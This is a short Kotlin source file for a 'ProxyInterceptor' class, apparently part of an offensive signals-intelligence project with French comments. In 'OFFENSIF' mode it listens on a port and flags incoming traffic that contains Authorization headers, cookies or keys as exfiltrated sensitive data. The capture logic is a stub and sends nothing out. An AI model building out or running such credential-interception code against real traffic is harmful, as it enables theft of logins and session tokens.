package com.fardc.sigint.core

import java.net.ServerSocket
import java.net.Socket
import java.io.*

class ProxyInterceptor(private val logger: BlackBox, private val brain: StateMachine) {
    private var running = false

    fun startService(port: Int) {
        // Règle d'engagement (ROE)
        if (brain.mode != "OFFENSIF") {
            logger.recordIncident("PROXY_ERR", "Interception interdite en mode ${brain.mode}")
            return
        }

        running = true
        Thread {
            try {
                val server = ServerSocket(port)
                logger.recordIncident("PROXY_INIT", "Écoute tactique sur port $port")
                
                while (running) {
                    val client = server.accept()
                    processTraffic(client)
                }
            } catch (e: Exception) {
                logger.recordIncident("PROXY_CRITICAL", e.message ?: "Socket Error")
            }
        }.start()
    }

    private fun processTraffic(socket: Socket) {
        Thread {
            try {
                val input = socket.getInputStream()
                val buffer = ByteArray(4096)
                val bytesRead = input.read(buffer)
                
                if (bytesRead > 0) {
                    val content = String(buffer, 0, bytesRead)
                    
                    // Analyse de signatures sensibles
                    if (content.contains("Authorization") || content.contains("cookie") || content.contains("key")) {
                        logger.recordIncident("CAPTURE_HIT", "Données sensibles exfiltrées de ${socket.inetAddress}")
                        // Ici, les données seraient envoyées au Vault pour chiffrement
                    }
                }
                socket.close()
            } catch (e: Exception) {}
        }.start()
    }

    fun shutdown() { running = false }
}
